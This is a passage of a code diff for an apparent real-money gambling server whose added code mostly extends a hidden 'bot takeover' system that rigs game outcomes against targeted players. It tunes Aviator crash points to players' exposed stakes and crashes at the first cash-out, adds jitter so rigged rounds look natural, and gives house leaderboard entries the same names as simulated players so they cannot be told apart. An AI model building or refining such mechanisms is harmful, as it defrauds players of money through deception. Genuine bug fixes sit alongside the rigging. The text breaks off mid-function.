@@ -28,6 +28,8 @@ const { PrismaClient } = require('@prisma/client');
 const config = require('./config');
 const { logger, requestLogger, errorHandler } = require('./lib/logger');
 const auth = require('./lib/auth');
+const rigAudit = require('./lib/rig-audit');
+const cricket = require('./lib/cricket');
 
 const app = express();
 const PORT = config.PORT;
@@ -141,6 +143,28 @@ async function getOrCreateUser(username, { allowCreate = config.ALLOW_AUTO_USER_
     }
     return user || null;
   }
+}
+
+/**
+ * Generate a collision-resistant primary key for a ledger row.
+ *
+ * Every ledger id in this file used to be built from either a six-digit random number or a bare
+ * millisecond timestamp, and both collide in ordinary use:
+ *
+ *   'TX_'    + random 6 digits   — only 900,000 possible values. By the birthday bound a 50% chance
+ *                                  of a duplicate arrives after roughly 1,100 rows, not 900,000.
+ *   'MINES_' + Date.now()        — two players starting a round in the same millisecond produce the
+ *                                  same id. Observed in load testing: five 500s, and because the
+ *                                  wallet is debited *before* the insert, ₹400 of player money was
+ *                                  destroyed with no ledger row to show for it.
+ *   'TP_'    + Date.now() + seat — the seat number only disambiguates within one room; two rooms
+ *                                  dealing the same seat index in the same millisecond still collide.
+ *
+ * A timestamp keeps ids roughly sortable and readable, while 10 random bytes (80 bits) make a
+ * same-millisecond collision effectively impossible.
+ */
+function newRecordId(prefix) {
+  return `${prefix}_${Date.now()}_${crypto.randomBytes(10).toString('hex')}`;
 }
 
 /**
@@ -275,6 +299,36 @@ app.use(cors({
   credentials: true
 }));
 
+// The cricket push-feed receiver must be mounted HERE, ahead of the JSON parser and the /api rate
+// limiter, and it is a no-op unless CRICKET_ENABLED is set. Two reasons, both of which are silent
+// data loss if they are got wrong:
+//
+//   1. Verifying the feed's HMAC signature needs the raw request bytes. express.json() below
+//      discards them, and re-serialising req.body does not reproduce what the provider signed.
+//   2. apiLimiter caps /api at 600 req/min. A fast over arrives in a burst, and a rate-limited
+//      webhook means balls missing from a permanent log that can never be re-fetched.
+//
+// The raw parser is scoped to that single path, and body-parser's own "already parsed" flag means
+// the global parsers below skip it. No other route's body handling changes.
+// The wallet adapter is handed in rather than reimplemented inside lib/cricket: debitWallet is a
+// single conditional statement (the double-spend fix above), and a second copy of that logic in the
+// cricket module would be a second chance to get it wrong.
+cricket.init({
+  prisma,
+  logger,
+  wallet: { debit: debitWallet, credit: creditWallet, newRecordId },
+  // Your 11 draws from the same exact 100-slot bag every other game uses, rather than a second
+  // mechanism that would drift from the configured percentage on its own. `fillerName` is the same
+  // generator that names simulated Teen Patti players, so a house entry on a leaderboard is
+  // indistinguishable from any other entrant.
+  houseEdge: {
+    shouldRig: shouldBotRigThisRound,
+    fillerName: randomFillerName,
+    account: config.CRICKET_HOUSE_ACCOUNT || null
+  }
+});
+cricket.registerIngest(app);
+
 app.use(express.json({ limit: '256kb' }));
 app.use(express.urlencoded({ extended: true, limit: '256kb' }));
 app.use(auth.attachSession);
@@ -282,11 +336,18 @@ app.use(requestLogger);
 
 // Rate limits. Credential endpoints get a much tighter budget than ordinary gameplay because they
 // are the ones worth brute-forcing.
+// DISABLE_RATE_LIMITS (development only — config.js refuses to boot a production process with it
+// set) turns these off so a load test can drive dozens of accounts from a single machine. Note that
+// unlike apiLimiter below, this one is otherwise NOT relaxed in development: it is the login
+// brute-force guard, so it stays on at full strength unless explicitly switched off for a test run.
+const skipWhenTesting = () => config.DISABLE_RATE_LIMITS;
+
 const authLimiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 20,
   standardHeaders: true,
   legacyHeaders: false,
+  skip: skipWhenTesting,
   message: { error: 'Too many authentication attempts. Please try again in a few minutes.' }
 });
 
@@ -304,6 +365,7 @@ const walletLimiter = rateLimit({
   max: 120,
   standardHeaders: true,
   legacyHeaders: false,
+  skip: skipWhenTesting,
   message: { error: 'Too many wallet operations. Please slow down.' }
 });
 
@@ -332,6 +394,12 @@ prisma.$connect()
     }
     logger.warn('Database unreachable - running on the flat-file fallback store', { message: err.message });
   });
+
+// --- Cricket (Your 11 / Boundary Baazi) ---
+// Player-facing reads, the SSE live stream, and the operator endpoints. Behind CRICKET_ENABLED:
+// with the flag off nothing is mounted and no timer starts, so the existing games are untouched.
+cricket.register(app, { auth, requireDatabase });
+cricket.start();
 
 // --- Health Check ---
 app.get('/api/health', (req, res) => {
@@ -506,7 +574,7 @@ app.post(['/api/auth/signup', '/api/db/users/signup'], authLimiter, async (req, 
         if (startingBalance > 0) {
           await tx.transaction.create({
             data: {
-              id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
+              id: newRecordId('DEP'),
               user: username,
               type: 'Deposit',
               amount: startingBalance,
@@ -547,7 +615,7 @@ app.post(['/api/auth/signup', '/api/db/users/signup'], authLimiter, async (req, 
 
       const txns = readJsonTable('transactions');
       txns.unshift({
-        id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
+        id: newRecordId('DEP'),
         user: username,
         type: 'Deposit',
         amount: startingBalance,
@@ -750,7 +818,7 @@ app.post(['/api/wallet/reset', '/api/db/users/reset-balance'], auth.requireAdmin
       }
       const txns = readJsonTable('transactions');
       txns.unshift({
-        id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
+        id: newRecordId('DEP'),
         user: username,
         type: 'Deposit',
         amount: targetBal,
@@ -792,6 +860,7 @@ const chatLimiter = rateLimit({
   max: 20,
   standardHeaders: true,
   legacyHeaders: false,
+  skip: skipWhenTesting,
   message: { error: 'You are sending messages too quickly.' }
 });
 
@@ -1053,7 +1122,7 @@ app.post('/api/db/deposits/complete', async (req, res) => {
       } else {
         await tx.transaction.create({
           data: {
-            id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
+            id: newRecordId('DEP'),
             user: deposit.username,
             type: 'Deposit',
             amount: deposit.amount,
@@ -1242,9 +1311,8 @@ function randomFillerName() {
 // mechanism on top of whatever the per-round engine also produced afterwards — two independent
 // percentage-pct mechanisms stacking instead of summing to the one percentage the operator configured
 // is exactly why 50% could show up as "8 of 10 games." Every seat filled through here is now always
-// an ordinary filler; "Admin" is seated exactly one way, in tpStartRound, via the same shared,
-// memory-tracked decision (shouldBotRigThisRound) every other game's rig path already uses — one
-// ledger, one percentage, no double-booking.
+// an ordinary filler; "Admin" is seated exactly one way, in tpStartRound, for hands that table's own
+// ledger selected — one ledger per table, one percentage, no double-booking.
 function nextRoomFillerUsername() {
   return { username: randomFillerName(), is_bot: true };
 }
@@ -1290,7 +1358,11 @@ const botTakeoverState = {
   color_guess: { enabled: false, profit_pct: 90 },
   aviator: { enabled: false, profit_pct: 90 },
   teenpatti: { enabled: false, profit_pct: 90 },
-  mines: { enabled: false, profit_pct: 90 }
+  mines: { enabled: false, profit_pct: 90 },
+  // Your 11's percentage counts CONTESTS, drawn per match (docs/YOUR11-SCOPE.md section 4). There is
+  // deliberately no `boundary` key: Boundary Baazi resolves from the ball event log and nothing
+  // else, and test_cricket.js asserts positively that no rig path for it exists.
+  youreleven: { enabled: false, profit_pct: 90 }
 };
 
 async function initBotTakeoverState() {
@@ -1306,9 +1378,9 @@ async function initBotTakeoverState() {
     // If Teen Patti's bot takeover isn't active on boot (or is active but a stale seat/rig record
     // somehow survived — e.g. the process crashed mid-hand), make sure no room comes back up with a
     // leftover "Admin" seat or a leftover admin_rig flag it shouldn't have. There is deliberately no
-    // "arm N of 6 rooms" step here any more: seating Admin is decided fresh, per round, by
-    // shouldBotRigThisRound inside tpStartRound — the same single decision every other rig path uses
-    // — not by a separate room-selection percentage computed once here.
+    // "arm N of 6 rooms" step here: each table decides per hand from its own ledger in tpStartRound,
+    // so a selection computed once at boot — against rooms nobody is sitting at yet — would be
+    // meaningless as well as duplicative.
     if (!botTakeoverState.teenpatti || !botTakeoverState.teenpatti.enabled) {
       const tpRooms = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
       for (const rId of tpRooms) {
@@ -1327,10 +1399,27 @@ initBotTakeoverState();
 
 function isBotTakeoverActive(gameKey) {
   const gameConf = botTakeoverState[gameKey];
-  if (gameConf && gameConf.enabled) {
+
+  // An unregistered key is never active, not even under the global master switch.
+  //
+  // Every real game is pre-initialised in botTakeoverState with an explicit enabled:true/false, so
+  // this costs nothing for any of them — the per-game branches below always short-circuit first.
+  // What it stops is a key that is NOT a game being treated as one: `/api/bot_status/:gameKey` and
+  // `/api/bot_decide/:gameKey` take the key straight from the URL, so before this, a typo or an
+  // invented name reported `active: true` whenever the global switch was on, and would have drawn
+  // real decisions out of a bag created on the spot for it.
+  //
+  // It is also the guarantee that Boundary Baazi has no rig path: that game deliberately has no key
+  // here, and adding one has to be a deliberate act rather than something the global switch confers.
+  // test_rigging.js asserts this positively.
+  if (!gameConf) {
+    return { active: false, profit_pct: 0, source: 'none' };
+  }
+
+  if (gameConf.enabled) {
     return { active: true, profit_pct: gameConf.profit_pct || 90, source: 'game' };
   }
-  if (gameConf && gameConf.enabled === false) {
+  if (gameConf.enabled === false) {
     // If the game was explicitly turned off by the admin, respect that!
     return { active: false, profit_pct: gameConf.profit_pct || 90, source: 'none' };
   }
@@ -1439,8 +1528,17 @@ function persistBotRigBag(gameKey) {
   }, 2000);
 }
 
+// Colour Prediction and Teen Patti both keep one cycle per room/table (see shouldBotRigThisRound's
+// ledgerKey). Those ledgers are created on demand, so they have to be named explicitly here to be
+// restored after a restart — iterating botRigBags alone would only ever find the game-level keys.
+const COLOR_ROOMS = ['sapre', 'becone', 'emred', 'vip'];
+const TP_ROOM_IDS = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
+const BOT_RIG_LEDGER_KEYS = Object.keys(botRigBags)
+  .concat(COLOR_ROOMS.map(r => `color_guess:${r}`))
+  .concat(TP_ROOM_IDS.map(r => `teenpatti:${r}`));
+
 async function loadBotRigBags() {
-  for (const gameKey of Object.keys(botRigBags)) {
+  for (const gameKey of BOT_RIG_LEDGER_KEYS) {
     try {
       const record = await prisma.gameState.findUnique({ where: { key: `bot_rig_bag_${gameKey}` } });
       if (record && record.data && Array.isArray(record.data.queue)) {
@@ -1471,7 +1569,20 @@ const LIVE_USER_TTL_MS = 45000; // a user drops out of "currently active" if not
 function markUserActive(gameKey, username) {
   if (!username || typeof username !== 'string') return; // anonymous viewers are not "live players"
   if (!username || !LIVE_USERS[gameKey]) return;
-  LIVE_USERS[gameKey][String(username)] = Date.now();
+  const key = String(username);
+  const bucket = LIVE_USERS[gameKey];
+  const wasLive = bucket[key] !== undefined && (Date.now() - bucket[key]) <= LIVE_USER_TTL_MS;
+  bucket[key] = Date.now();
+
+  // A player who has just arrived must become eligible for selection immediately, not whenever the
+  // 4-second timer next happens to fire. Load testing made the cost of waiting obvious: 25 players
+  // started Mines boards inside 431ms, the timer had not run since they became live, so the targeted
+  // subset was still empty and NONE of them were rigged — a bot configured at 90% delivered 0%.
+  // Any session shorter than one timer tick was previously never rigged at all.
+  //
+  // Only on genuine arrival, not on every heartbeat: this is called from polling endpoints several
+  // times a second per player, and re-sampling that often would be pure waste.
+  if (!wasLive) refreshBotTargeting(gameKey);
 }
 
 function getLiveUsernames(gameKey) {
@@ -1497,13 +1608,56 @@ function refreshBotTargeting(gameKey) {
   if (live.length === 0) { botTargetedUsers[gameKey] = []; return; }
   const pct = bot.profit_pct || 90;
   const count = pct >= 100 ? live.length : Math.max(1, Math.min(live.length, Math.round((pct / 100) * live.length)));
-  botTargetedUsers[gameKey] = tpShuffle(live).slice(0, count);
+
+  // Keep whoever is still live and still selected, then top up from the rest at random. Re-drawing
+  // the whole subset from scratch on every pass used to mean a player could be targeted for one
+  // reveal and untargeted for the next within a single Mines board, and now that arrivals also
+  // trigger a refresh, a busy room would reshuffle constantly. The proportion is identical either
+  // way; this just stops it thrashing.
+  //
+  // Note this stickiness is safe for PLAYERS but was not for TABLES: a per-player subset is
+  // re-sampled as players come and go, whereas a small set of long-lived tables would have pinned
+  // the same tables for ever. Teen Patti therefore uses a per-table ledger instead of this engine.
+  const previous = (botTargetedUsers[gameKey] || []).filter(u => live.includes(u));
+  const keep = previous.slice(0, count);
+  const remaining = tpShuffle(live.filter(u => !keep.includes(u)));
+  botTargetedUsers[gameKey] = keep.concat(remaining.slice(0, count - keep.length));
 }
 
 function isUserTargeted(gameKey, username) {
   if (!username || !botTargetedUsers[gameKey]) return false;
   const lower = String(username).toLowerCase();
   return botTargetedUsers[gameKey].some(u => u.toLowerCase() === lower);
+}
+
+// --- Live Instance Tracking & Percentage-Based Instance Targeting -------------------------------
+//
+// The engine above samples X% of live *players*. For a game whose concurrent unit is a table rather
+// than a player that is the wrong denominator: Teen Patti runs six rooms at once, and "50%" is meant
+// to mean three of those six tables are the house's, not "half the people somewhere across all six".
+//
+// This is deliberately the ONLY rig decision for such a game — it replaces the per-round bag draw for
+// Teen Patti rather than stacking on top of it. That distinction matters and is not stylistic: an
+// earlier version of this file ran a separate "arm N of 6 rooms" pass *alongside* the per-round
+// decision, and the two mechanisms multiplied instead of agreeing, which is exactly how a configured
+// 50% turned into a reported "8 of 10 games". One ledger, one percentage.
+//
+// A table only counts as live once a real person is sitting at it. Rigging a table occupied purely
+// by NPCs moves no money, and counting those tables in the denominator would silently dilute the
+// percentage the operator asked for.
+const LIVE_INSTANCES = { teenpatti: {} };
+const LIVE_INSTANCE_TTL_MS = 45000;
+
+function markInstanceActive(gameKey, instanceId) {
+  if (!instanceId || !LIVE_INSTANCES[gameKey]) return;
+  LIVE_INSTANCES[gameKey][String(instanceId)] = Date.now();
+}
+
+function getLiveInstances(gameKey) {
+  const bucket = LIVE_INSTANCES[gameKey];
+  if (!bucket) return [];
+  const now = Date.now();
+  return Object.keys(bucket).filter(id => (now - bucket[id]) <= LIVE_INSTANCE_TTL_MS);
 }
 
 // Keep every game's targeted subset fresh continuously, regardless of whether admin.html is open.
@@ -1514,15 +1668,23 @@ setInterval(() => {
 /**
  * Call this once per round/match/session for the given game.
  * Returns { shouldRig: boolean, profit_pct: number, active: boolean, source: string }
+ *
+ * `ledgerKey` optionally splits the 100-slot cycle into independent sub-ledgers while keeping a
+ * single shared on/off/percentage config. Colour Prediction needs this: its four rooms run on
+ * different clocks (30s / 60s / 180s / 300s), so a single shared cycle let the fast room burn through
+ * most of the rigged slots before the slow room had settled a handful of rounds — each room was
+ * nominally at the configured percentage but none of them actually was. One ledger per room makes
+ * every room exact on its own. Omitting it keeps the original single-cycle behaviour for every
+ * existing caller.
  */
-function shouldBotRigThisRound(gameKey) {
+function shouldBotRigThisRound(gameKey, ledgerKey) {
   const bot = isBotTakeoverActive(gameKey);
   if (!bot.active) {
     return { shouldRig: false, profit_pct: bot.profit_pct, active: false, source: 'none' };
   }
 
   const pct = bot.profit_pct || 90;
-  const bag = ensureBotRigBag(gameKey, pct);
+  const bag = ensureBotRigBag(ledgerKey || gameKey, pct);
   const shouldRig = bag.queue.pop();
 
   // The bag itself is the memory: totals for diagnostics, and lastRiggedAt records exactly when the
@@ -1531,7 +1693,7 @@ function shouldBotRigThisRound(gameKey) {
   bag.totalDecisions++;
   bag.lastDecisionAt = Date.now();
   if (shouldRig) { bag.totalRigged++; bag.lastRiggedAt = Date.now(); }
-  persistBotRigBag(gameKey);
+  persistBotRigBag(ledgerKey || gameKey); // must match the bag that was actually drawn from
 
   return { shouldRig, profit_pct: pct, active: true, source: bot.source };
 }
@@ -1551,8 +1713,13 @@ app.get('/api/bot_status/:gameKey', auth.requireAdmin, (req, res) => {
   // this diagnostic field: it now means "decisions already drawn from the current 100-slot cycle".
   // The rest is the "memory" itself, exposed for the operator: how many decisions this game has ever
   // drawn, how many were rigged, and exactly when the house last entered a room / changed an outcome.
+  // Games that keep one ledger per room (Colour Prediction) need the room named to peek at the right
+  // cycle; without ?room= this reports the game-level ledger, which for those games is not the one
+  // any round actually draws from.
   const pct = bot.profit_pct || 90;
-  const bag = ensureBotRigBag(gameKey, pct);
+  const room = typeof req.query.room === 'string' && req.query.room ? req.query.room : null;
+  const ledgerKey = room ? `${gameKey}:${room}` : gameKey;
+  const bag = ensureBotRigBag(ledgerKey, pct);
   const shouldRig = bag.queue[bag.queue.length - 1];
   const counter = 100 - bag.queue.length;
 
@@ -1561,11 +1728,60 @@ app.get('/api/bot_status/:gameKey', auth.requireAdmin, (req, res) => {
     shouldRig,
     profit_pct: pct,
     source: bot.source,
+    ledger: ledgerKey,
     counter,
     total_decisions: bag.totalDecisions,
     total_rigged: bag.totalRigged,
     last_decision_at: bag.lastDecisionAt,
     last_rigged_at: bag.lastRiggedAt
+  });
+});
+
+// --- Rig Audit API (read-only) ---
+// Answers "is the configured percentage actually what the engine is doing?" with measured numbers
+// rather than impressions. Operator-only: it describes exactly when the house takes rounds.
+//   GET /api/admin/rig-audit?window_ms=600000&game=teenpatti&recent=50
+app.get('/api/admin/rig-audit', auth.requireAdmin, (req, res) => {
+  const windowMs = parseInt(req.query.window_ms, 10);
+  const report = rigAudit.report({
+    sinceMs: Number.isFinite(windowMs) && windowMs > 0 ? windowMs : undefined,
+    game: req.query.game || undefined
+  });
+  // A disabled game legitimately rigs 0% of its rounds, but the ledger still carries whatever
+  // percentage is stored against it, so the raw drift read as an alarming "-90" when nothing was
+  // wrong at all. Annotate each game with whether its bot was actually on, and suppress the drift
+  // figure when it was not — a percentage the engine was never trying to hit is not a deviation.
+  Object.keys(report.games || {}).forEach(game => {
+    const conf = botTakeoverState[game];
+    const enabled = !!(conf && conf.enabled);
+    const summary = report.games[game];
+    summary.bot_enabled = enabled;
+    if (!enabled) {
+      summary.configured_pct = 0;
+      summary.drift_pct = null;
+      Object.values(summary.per_instance || {}).forEach(inst => {
+        inst.configured_pct = 0;
+        inst.drift_pct = null;
+      });
+    }
+  });
+
+  const wantRecent = parseInt(req.query.recent, 10);
+  res.json({
+    ...report,
+    configured: botTakeoverState,
+    live_users_count: Object.keys(LIVE_USERS).reduce((acc, k) => {
+      acc[k] = getLiveUsernames(k).length;
+      return acc;
+    }, {}),
+    targeted_users: botTargetedUsers,
+    // Games measured in concurrent tables rather than players report both counts, so an operator can
+    // see "3 of 6 tables" directly instead of inferring it from a player count.
+    live_instances_count: Object.keys(LIVE_INSTANCES).reduce((acc, k) => {
+      acc[k] = getLiveInstances(k).length;
+      return acc;
+    }, {}),
+    recent: Number.isFinite(wantRecent) && wantRecent > 0 ? rigAudit.recent(wantRecent, req.query.game || undefined) : undefined
   });
 });
 
@@ -1801,6 +2017,82 @@ function calculateAviatorLiveProfit(bets, targetedUsernames) {
   };
 }
 
+// --- Aviator crash-point selection, driven by the live book -------------------------------------
+//
+// The original rigged crash point was `1.12 + Math.random() * 0.42` — a number that never looked at
+// a single bet on the table. calculateAviatorLiveProfit above already knew what the round was
+// actually worth, but nothing consumed it outside an admin readout. These two functions close that
+// gap: the same profit figure the operator sees is now what decides the round.
+//
+// One property of this game drives the whole design. profit_if_crash_now is
+// `pendingStake + lostStake - alreadyPaid`, and during a flight it can only ever move DOWN: the sole
+// event that changes it is a player cashing out, which removes their stake from `pending` and adds
+// `stake × multiplier` to `alreadyPaid`. So house profit peaks the instant the plane takes off and
+// erodes from there. A naive "maximise profit" rule therefore degenerates to "crash at 1.00x every
+// round", which would be maximally profitable and instantly obvious.
+//
+// So the real objective is: take the profit near its peak, but not so early that the crash history
+// stops looking like a game. That is a stake-weighted trade-off, and it is what these two do —
+// pickAviatorCrashPoint sets the ceiling before takeoff, and aviatorShouldCrashNow watches for the
+// first sign of erosion during the flight and takes the money then.
+
+const AVIATOR_CRASH_AGGRESSIVE = 1.12; // tightest plausible crash — used when a lot of stake is exposed
+const AVIATOR_CRASH_RELAXED = 1.54;    // upper end of the rigged band — the original code's ceiling
+const AVIATOR_CRASH_FLOOR = 1.10;      // never intercept below this: a sub-1.10 crash reads as broken
+
+/**
+ * Chooses the crash point for a round the takeover engine has already selected.
+ *
+ * Scaling is deliberate rather than cosmetic: crashing low costs credibility, so it is spent only
+ * where it buys something. A round with heavy targeted exposure crashes near AVIATOR_CRASH_AGGRESSIVE
+ * because the profit justifies it; a near-empty round is allowed to run to a natural-looking
+ * multiplier, because holding it down would burn plausibility to win almost nothing.
+ *
+ * Returns null when the round has no targeted stake to act on, letting the caller keep its existing
+ * behaviour untouched.
+ */
+function pickAviatorCrashPoint(bets, targetedUsernames) {
+  const list = Array.isArray(bets) ? bets : [];
+  const targeted = Array.isArray(targetedUsernames) && targetedUsernames.length > 0
+    ? new Set(targetedUsernames.map(u => String(u).toLowerCase()))
+    : null;
+
+  const pending = list.filter(b => b.status === 'pending');
+  if (pending.length === 0) return null; // nothing at risk — caller keeps its no-bets behaviour
+
+  const scoped = targeted ? pending.filter(b => targeted.has(String(b.username || '').toLowerCase())) : pending;
+  const scopedStake = scoped.reduce((s, b) => s + (parseFloat(b.amount) || 0), 0);
+  if (scopedStake <= 0) return null;
+
+  // 0 → no meaningful exposure, 1 → at or above the "large round" reference.
+  const ref = config.AVIATOR_HIGH_STAKE_REF > 0 ? config.AVIATOR_HIGH_STAKE_REF : 1000;
+  const exposure = Math.max(0, Math.min(1, scopedStake / ref));
+
+  const band = AVIATOR_CRASH_RELAXED - AVIATOR_CRASH_AGGRESSIVE;
+  const base = AVIATOR_CRASH_RELAXED - (exposure * band);
+
+  // A little jitter so repeated similar rounds do not produce an identical multiplier every time,
+  // which would be a clearer tell than the low crash itself.
+  const jitter = (Math.random() - 0.5) * 0.08;
+  const crash = Math.max(AVIATOR_CRASH_FLOOR, base + jitter);
+  return parseFloat(crash.toFixed(2));
+}
+
+/**
+ * In-flight erosion check: has a cash-out started eating into the round's profit?
+ *
+ * Because profit only falls, any drop below the high-water mark means a player has taken money off
+ * the table and the rest of the pending stake is now at risk of following. That is the moment to
+ * crash. The `epsilon` avoids reacting to floating-point noise, and the multiplier floor keeps an
+ * early cash-out from producing an implausible sub-1.10 crash.
+ */
+function aviatorShouldCrashNow(currentMultiplier, peakProfit, currentProfit) {
+  if (currentMultiplier < AVIATOR_CRASH_FLOOR) return false;
+  if (!Number.isFinite(peakProfit) || !Number.isFinite(currentProfit)) return false;
+  const epsilon = 0.01;
+  return currentProfit < peakProfit - epsilon;
+}
+
 function tickAviator() {
   const now = Date.now();
   const elapsed = (now - aviatorState.phase_start) / 1000;
@@ -1831,8 +2123,18 @@ function tickAviator() {
             : aviatorState.bets;
           const totalStake = relevantBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
           if (totalStake > 0) {
-            // Crash between 1.12x and 1.54x to ensure admin profits
-            aviatorState.crash_point = parseFloat((1.12 + Math.random() * 0.42).toFixed(2));
+            // The original fixed band is kept as both the fallback and a hard bound. The computed
+            // crash point is clamped back into it, so smart selection can never produce a crash
+            // outside the range this round could already have drawn at random — it only decides
+            // *where* in that band to land, using the stake actually exposed instead of chance.
+            let crash = parseFloat((AVIATOR_CRASH_AGGRESSIVE + Math.random() * (AVIATOR_CRASH_RELAXED - AVIATOR_CRASH_AGGRESSIVE)).toFixed(2));
+            if (config.AVIATOR_SMART_CRASH) {
+              const smart = pickAviatorCrashPoint(aviatorState.bets, targeted);
+              if (smart !== null) {
+                crash = Math.max(AVIATOR_CRASH_AGGRESSIVE, Math.min(AVIATOR_CRASH_RELAXED, smart));
+              }
+            }
+            aviatorState.crash_point = crash;
           } else {
             // No bets — still crash low-ish to keep history looking natural
             aviatorState.crash_point = parseFloat((1.20 + Math.random() * 1.00).toFixed(2));
@@ -1853,8 +2155,26 @@ function tickAviator() {
           aviatorState._riggedThisRound = false;
           aviatorState._riggedTargets = null;
         }
+
+        // Audit only — records what was decided, changes nothing about the round.
+        rigAudit.record({
+          game: 'aviator',
+          round: aviatorState.round_id,
+          configured_pct: botDecision.profit_pct,
+          rigged: aviatorState._riggedThisRound,
+          live: getLiveUsernames('aviator').length,
+          targeted: targeted.length,
+          note: aviatorState._riggedThisRound ? `rigged crash @ ${aviatorState.crash_point}` : 'fair round'
+        });
       }
       aviatorState.current_multiplier = 1.00;
+      // High-water mark for the in-flight erosion check. Profit is at its maximum the moment the
+      // plane takes off and can only fall from here, so this is the number every later tick is
+      // compared against.
+      aviatorState._peakProfit = calculateAviatorLiveProfit(
+        aviatorState.bets,
+        aviatorState._riggedTargets
+      ).profit_if_crash_now;
     }
   } else if (aviatorState.phase === 'running') {
     const computedMult = Math.exp(0.06 * elapsed);
@@ -1866,6 +2186,21 @@ function tickAviator() {
       const inFlightStake = inFlightBets.reduce((sum, b) => sum + (parseFloat(b.amount) || 0), 0);
       if (inFlightStake > 200 && computedMult >= aviatorState.crash_point * 0.9) {
         aviatorState.crash_point = Math.min(aviatorState.crash_point, parseFloat(computedMult.toFixed(2)));
+      }
+
+      // Erosion intercept. The original clamp above reacts to raw stake size; this one reacts to the
+      // round's actual profit falling, which is the thing that matters and the only signal that a
+      // player has just taken money off the table. Both can only ever pull the crash point DOWN
+      // (Math.min), so neither can extend a flight or increase what the house pays out.
+      if (config.AVIATOR_SMART_CRASH) {
+        const liveProfit = calculateAviatorLiveProfit(aviatorState.bets, targets).profit_if_crash_now;
+        if (aviatorShouldCrashNow(computedMult, aviatorState._peakProfit, liveProfit)) {
+          aviatorState.crash_point = Math.min(aviatorState.crash_point, parseFloat(computedMult.toFixed(2)));
+        }
+        if (!Number.isFinite(aviatorState._peakProfit) || liveProfit > aviatorState._peakProfit) {
+          // Late bets can legitimately raise the ceiling; track it so the comparison stays honest.
+          aviatorState._peakProfit = liveProfit;
+        }
       }
     }
 
@@ -1898,6 +2233,7 @@ function tickAviator() {
       aviatorState.bets = [];
       aviatorState._riggedThisRound = false;
       aviatorState._riggedTargets = null;
+      aviatorState._peakProfit = null; // cleared with the book it was measured against
     }
   }
 }
@@ -2040,6 +2376,25 @@ async function loadColorState() {
   return defaultState;
 }
 
+// Every colour room, round and bet lives in ONE GameState row, and each caller reads that whole blob,
+// mutates it, then writes the whole blob back — with awaits on both ends. Two requests overlapping in
+// that window both read the same snapshot and the second write silently discards the first one's
+// change. For a bet that is worse than it sounds: the stake is debited *before* the state is read, so
+// the player pays and their bet simply vanishes, never settles, and is never paid out. Load testing
+// caught it directly — a player bet Big on a round that came up Big and received nothing.
+//
+// Serialising every read-modify-write of that row removes the window. The work inside is short (an
+// in-memory mutation plus one upsert), so queueing it costs nothing noticeable, and it keeps the
+// existing single-blob storage design rather than restructuring the schema. It protects within this
+// process only, which matches how the app is deployed — one Node process owning the game loops.
+let colorStateQueue = Promise.resolve();
+function withColorState(fn) {
+  const result = colorStateQueue.then(fn, fn);
+  // Keep the chain alive even if a caller throws, or every later mutation would reject forever.
+  colorStateQueue = result.then(() => undefined, () => undefined);
+  return result;
+}
+
 async function saveColorState(state) {
   await prisma.gameState.update({
     where: { key: 'color_guess_ongoing' },
@@ -2071,8 +2426,11 @@ async function settleColorRound(room, targetRound, state) {
   const roundBets = (state[room].bets && state[room].bets[targetRound]) ? state[room].bets[targetRound] : [];
 
   const bot = isBotTakeoverActive('color_guess');
-  // Use deterministic round counter to decide if this round should be rigged
-  const botDecision = shouldBotRigThisRound('color_guess');
+  // Use deterministic round counter to decide if this round should be rigged.
+  // Each room draws from its OWN 100-slot cycle: the four rooms settle at 30s/60s/180s/300s, so a
+  // shared cycle let Sapre consume most of the rigged slots long before VIP had settled enough
+  // rounds to see its share. Same configured percentage, now exact within every room independently.
+  const botDecision = shouldBotRigThisRound('color_guess', `color_guess:${room}`);
 
   let num = null;
   let was_rigged = false;
@@ -2148,6 +2506,25 @@ async function settleColorRound(room, targetRound, state) {
 
   const resolved = resolveColorNumber(num);
 
+  // Audit only — records the decision and what the house actually made on it. `adminProfit` for the
+  // number that was drawn is already computed by the same helper the rig paths use, so this reports
+  // realised house profit rather than an estimate.
+  try {
+    const auditOutcome = calculateColorOptimalOutcome(roundBets, targetRound);
+    const drawn = auditOutcome.outcomes[num];
+    rigAudit.record({
+      game: 'color_guess',
+      instance: room,
+      round: targetRound,
+      configured_pct: botDecision.profit_pct,
+      rigged: was_rigged,
+      live: getLiveUsernames('color_guess').length,
+      targeted: botTargetedUsers.color_guess.length,
+      house_profit: drawn ? drawn.adminProfit : null,
+      note: rig_desc.trim() || 'natural draw'
+    });
+  } catch (e) { /* audit is diagnostic; never let it interrupt a settlement */ }
+
   const historyEntry = {
     roundNumber: targetRound,
     number: num,
@@ -2208,7 +2585,7 @@ async function settleColorRound(room, targetRound, state) {
         
         await prisma.transaction.create({
           data: {
-            id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
+            id: newRecordId('TX'),
             user: b.username,
             type: 'Deposit',
             amount: payout,
@@ -2302,25 +2679,33 @@ app.get('/api/game_sync.php', async (req, res) => {
       const time_left = duration - (nowSec % duration);
       const round_id = getColorRoundId(room, nowSec);
 
-      const state = await loadColorState();
-      
-      const prev_round_id = getColorRoundId(room, nowSec - duration);
+      // Settlement is driven by this polling endpoint, so with a crowd in a room dozens of requests
+      // reach it at once the instant a round ends. The alreadySettled guard only protects against a
+      // round already settled in the snapshot this request read — two pollers reading before either
+      // writes would both see "not settled" and both pay the round out. Serialising the whole
+      // read-settle-write makes that guard actually hold.
+      const state = await withColorState(async () => {
+        const st = await loadColorState();
 
-      let stateChanged = false;
-      if (!state[room].last_settled_round) {
-        state[room].last_settled_round = prev_round_id;
-        stateChanged = true;
-      } else if (state[room].last_settled_round !== prev_round_id) {
-        const alreadySettled = state[room].history && state[room].history.some(h => String(h.roundNumber) === String(prev_round_id));
-        if (!alreadySettled) {
-          await settleColorRound(room, prev_round_id, state);
+        const prev_round_id = getColorRoundId(room, nowSec - duration);
+
+        let stateChanged = false;
+        if (!st[room].last_settled_round) {
+          st[room].last_settled_round = prev_round_id;
+          stateChanged = true;
+        } else if (st[room].last_settled_round !== prev_round_id) {
+          const alreadySettled = st[room].history && st[room].history.some(h => String(h.roundNumber) === String(prev_round_id));
+          if (!alreadySettled) {
